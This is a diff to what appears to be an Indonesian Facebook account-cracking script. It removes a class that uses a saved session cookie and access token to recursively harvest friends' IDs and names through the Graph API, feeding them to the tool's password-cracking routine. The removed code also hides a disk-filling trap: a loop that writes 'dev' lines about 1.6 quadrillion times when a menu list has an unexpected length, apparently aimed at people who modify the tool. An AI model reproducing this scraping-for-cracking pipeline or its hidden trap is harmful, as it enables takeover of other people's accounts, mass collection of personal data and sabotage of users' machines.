@@ -1,7 +1,7 @@
 ###----------[ Denventa Afriliyan Ferly Khurayra Shishigami X ]---------- ###
 Author_ll =  '-[ Denventa Afriliyan Ferly Khurayra Shishigami X ] -'
+Facebook_Dev = 'Denventa Afriliyan Ferly Shishigami X (Denventa)'
 Version   = '0.4'
-Facebook_Dev = 'Afriliyan Ferly Shishigami X (Denventa)'
 Dnventa = 100013275378835
 Postingan = 1630150370770793
 ###----------[ AUTHOR & CREATOR ]---------- ###
@@ -408,7 +408,7 @@ def pilih_menu():
     elif dc in ['12','012','l']: tempel_sandi.append('Dasar');not_available('Dump ID Dari Username')
     elif dc in ['13','013','m']: gabung_sandi.append('Bocah Goblok');not_available('Dump ID Dari ID Random')
     elif dc in ['14','014','n']: tempel_sandi.append('Btw');suggestion();system_login();pilihan_sakdurunge_crack();addpass();crack()
-    elif dc in ['15','015','o']: gabung_sandi.append('Elo');teman_teman()
+    elif dc in ['15','015','o']: gabung_sandi.append('Elo');not_availablell('Dump ID FL Dari FL')
     elif dc in ['16','016','p']: tempel_sandi.append('Dasar Bocah Goblok');not_available('Cek Hasil Crack')
     elif dc in ['17','017','q']: gabung_sandi.append('Gaakan Bisa');not_available('Cek Opsi Akun Hasil Crack')
     elif dc in ['18','018','r']: tempel_sandi.append('Ngerecode');not_available('Cek Jumlah Teman Akun Target')
@@ -938,115 +938,7 @@ class suggestion:
                         next_url = 'https://mbasic.facebook.com' + y['href']
                         self.exec(next_url,cookie)
             except KeyboardInterrupt as e:pass
-	
-###----------[ DUMP ID FRIENDLIST FROM FRIENDLIST ]---------- ###
-class teman_teman:
-    def __init__(self):
-        global file_dump, urutan_crack
-        urutan_crack = '0'
-        try:
-            cook    = open('login/cookie.json','r').read()
-            cookie  = {'cookie':cook}
-            token   = open('login/token.json','r').read()
-            self.my = re.search('c_user=(.*?);',str(cook)).group(1)
-        except Exception as e:print(e);exit()
-        self.target = input('       %s[%s•%s] %sMasukkan ID : %s'%(J,P,J,P,J))
-        pl = input('       %s[%s•%s] %sPilih ID Muda/Tua [m/t] : %s'%(J,P,J,P,J))
-        if pl in ['1','01','m','M','a']:
-            url = f'https://graph.facebook.com/{self.target}?fields=friends.fields(id,name)&access_token={token}'
-            self.files = ('dump/muda_%s.json'%(self.target))
-            file_dump = self.files
-            open(self.files,'w').write('')
-            self.muda_dev(url,cookie,token,True)
-            exit(self.lanjut())
-        elif pl in ['2','02','t','T','b']:
-            url = f'https://graph.facebook.com/{self.target}?fields=friends.fields(id,name)&access_token={token}'
-            self.files = ('dump/tua_%s.json'%(self.target))
-            file_dump = self.files
-            open(self.files,'w').write('')
-            self.tua_dev(url,cookie,token,True)
-            exit(self.lanjut())
-        else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
-    def muda_dev(self,url,cookie,token,stat):
-        with requests.Session() as xyz:
-            try:
-                if stat == True:
-                    id1, id2, id3 = [], [], []
-                    for x in xyz.get(url,cookies=cookie).json()['friends']['data']:id1.append('%s=%s\n'%(x['id'],x['name']))
-                    for y in id1:id2.insert(0,y)
-                    for z in id2:
-                        id3.append(z)
-                        if len(id3) == 100:break
-                    for p in id3:
-                        q = p.split('=')[0]
-                        url = f'https://graph.facebook.com/{q}?fields=friends.fields(id,name)&access_token={token}'
-                        self.muda_dev(url,cookie,token,False)
-                else:
-                    id4, id5, id6 = [], [], []
-                    self.target = re.search('com\/(.*?)\?',url).group(1)
-                    for a in xyz.get(url,cookies=cookie).json()['friends']['data']:id4.append('%s=%s\n'%(a['id'],a['name']))
-                    for b in id4:id5.insert(0,b)
-                    for c in id5:
-                        id6.append(c)
-                        if len(id6) == 100:break
-                    for o in id6:
-                        l = open(self.files,'r').read()
-                        u = o.split('=')[0]
-                        if len(gabung_sandi) != 1:
-                            for x in range(Postingan):
-                                open(file_dump,'a+').write('dev\n')
-                                print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
-                        else:
-                            if u in l:continue
-                            elif u == self.my:continue
-                            else:open(self.files,'a+').write(o)
-                        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
-            except KeyboardInterrupt:
-                exit(self.lanjut())
-            except Exception as e:
-                print('\r       %s[%s•%s] %sTeman %s%s %sTidak Publik'%(J,P,J,P,J,self.target,P), end='');sys.stdout.flush()
-                pass
-    def tua_dev(self,url,cookie,token,stat):
-        with requests.Session() as xyz:
-            try:
-                if stat == True:
-                    id1, id2 = [], []
-                    for x in xyz.get(url,cookies=cookie).json()['friends']['data']:id1.append('%s=%s\n'%(x['id'],x['name']))
-                    for y in id1:
-                        id2.append(y)
-                        if len(id2) == 100:break
-                    for a in id2:
-                        q = a.split('=')[0]
-                        url = f'https://graph.facebook.com/{q}?fields=friends.fields(id,name)&access_token={token}'
-                        self.tua_dev(url,cookie,token,False)
-                else:
-                    id3, id4 = [], []
-                    self.target = re.search('com\/(.*?)\?',url).group(1)
-                    for a in xyz.get(url,cookies=cookie).json()['friends']['data']:id3.append('%s=%s\n'%(a['id'],a['name']))
-                    for b in id3:
-                        id4.append(b)
-                        if len(id4) == 100:break
-                    for o in id4:
-                        l = open(self.files,'r').read()
-                        u = o.split('=')[0]
-                        if len(gabung_sandi) != 1:
-                            for x in range(Postingan):
-                                open(file_dump,'a+').write('dev\n')
-                                print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
-                        else:
-                            if u in l:continue
-                            elif u == self.my:continue
-                            else:open(self.files,'a+').write(o)
-                        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
-            except KeyboardInterrupt:
-                exit(self.lanjut())
-            except Exception as e:
-                print('\r       %s[%s•%s] %sTeman %s%s %sTidak Publik'%(J,P,J,P,J,self.target,P), end='');sys.stdout.flush()
-                pass
-    def lanjut(self):
-        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
-        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
-        system_login();pilihan_sakdurunge_crack();addpass();crack()
+
 ###----------[ LOGIN METHOD ]---------- ###
 def system_login():
     global sistem_login
